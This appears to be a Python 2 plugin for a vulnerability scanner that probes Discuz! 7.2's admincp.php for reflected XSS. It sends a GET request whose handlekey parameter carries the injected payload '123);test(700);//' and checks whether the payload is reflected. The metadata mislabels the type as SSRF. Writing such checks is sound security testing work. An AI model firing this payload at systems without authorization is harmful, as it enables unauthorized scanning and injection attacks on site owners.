# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "Discuz! 7.2 admincp.php XSS",
        "info": "Discuz! 7.2 admincp.php 存在反射型XSS漏洞",
        "level": "中危",
        "type": "SSRF",
        "author": "taro",
        "url": "",
        "keyword": "all:discuz",
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/admincp.php?infloat=yes&handlekey=123);test(700);//'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if 'return_123);test(700);//' in res.text:
            info = '存在反射型XSS: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
